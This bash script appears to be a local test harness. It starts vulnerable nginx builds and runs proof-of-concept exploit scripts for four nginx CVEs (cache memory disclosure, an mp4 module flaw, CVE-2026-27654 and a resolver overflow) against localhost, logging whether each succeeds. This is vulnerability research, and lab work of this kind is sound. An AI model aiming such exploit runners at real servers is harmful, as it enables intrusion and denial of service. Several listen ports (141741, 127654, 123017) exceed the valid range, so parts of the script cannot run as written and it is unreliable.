#!/usr/bin/env bash
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
stop(){ pkill -f "$LAB/nginx-" 2>/dev/null||true; pkill -f backend-7529.py 2>/dev/null||true; sleep 1; }

echo "=== CVE-2017-7529 ==="
stop
cat >"$LAB/conf/7529.conf" <<EOF
worker_processes 1;
error_log $LAB/7529-error.log info;
pid $LAB/7529.pid;
events { worker_connections 64; }
http {
    proxy_cache_path $LAB/cache levels=1:2 keys_zone=c:10m max_size=100m inactive=60m use_temp_path=off;
    upstream b { server 127.0.0.1:18081; }
    server {
        listen 17529;
        location / {
            proxy_cache c;
            proxy_cache_valid 200 10m;
            proxy_cache_lock off;
            proxy_pass http://b;
            add_header X-Cache-Status \$upstream_cache_status;
        }
    }
}
EOF
python3 "$LAB/backend-7529.py" &
sleep 1
"$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
for i in 1 2 3; do curl -sI "http://127.0.0.1:17529/" | grep -i cache; done
python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" "http://127.0.0.1:17529/" ; R7529=$?
for off in 605 1024 512 256 768; do
  python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" "http://127.0.0.1:17529/" $off && R7529=0 && break
done
echo "7529 exit $R7529"
stop

echo "=== CVE-2022-41741 ==="
"$LAB/nginx-1.23.1/sbin/nginx" -c "$LAB/conf/41741.conf"
python3 "$POCLAB/pocs/CVE-2022-41741/poc.py" "http://127.0.0.1:141741/evil.mp4"; R41741=$?
echo "41741 exit $R41741"
tail -5 "$LAB/41741-error.log" 2>/dev/null
stop

echo "=== CVE-2026-27654 ==="
mkdir -p "$LAB/datafiles"
unshare -Ur -m bash -c "
set -e
mkdir -p /data/files
mount --bind $LAB/datafiles /data/files
$LAB/nginx-1.29.6/sbin/nginx -c $LAB/conf/27654.conf
python3 $POCLAB/pocs/CVE-2026-27654/poc.py http://127.0.0.1:127654
" ; R27654=$?
echo "27654 exit $R27654"
tail -10 "$LAB/27654-error.log" 2>/dev/null
stop

echo "=== CVE-2021-23017 ==="
if [ "$(id -u)" -ne 0 ]; then
  echo "23017 skip: no root"
  R23017=2
else
  python3 -c "import scapy" 2>/dev/null || pip3 install -q scapy
  pkill dnsmasq 2>/dev/null||true
  dnsmasq --keep-in-foreground --port=53 --listen-address=127.0.0.53 --no-hosts --no-resolv &
  d=$!
  sleep 1
  cat >"$LAB/conf/23017.conf" <<EOF
worker_processes 1;
error_log $LAB/23017-error.log info;
pid $LAB/23017.pid;
events { worker_connections 64; }
http {
    resolver 127.0.0.53 valid=30s ipv6=off;
    server {
        listen 123017;
        location / {
            set \$u "http://resolve.test/";
            proxy_pass \$u;
        }
    }
}
EOF
  "$LAB/nginx-1.20.0/sbin/nginx" -c "$LAB/conf/23017.conf"
  timeout 20 python3 "$POCLAB/pocs/CVE-2021-23017/poc.py" -t 127.0.0.1 -r 127.0.0.53 &
  p=$!
  sleep 2
  curl -sf --max-time 5 http://127.0.0.1:123017/ >/dev/null || true
  wait $p; R23017=$?
  kill $d 2>/dev/null||true
  grep -E "signal|alert|exploited" "$LAB/23017-error.log" 2>/dev/null | tail -3
fi
echo "23017 exit $R23017"
stop

echo "SUMMARY 7529=$R7529 41741=$R41741 27654=$R27654 23017=$R23017"
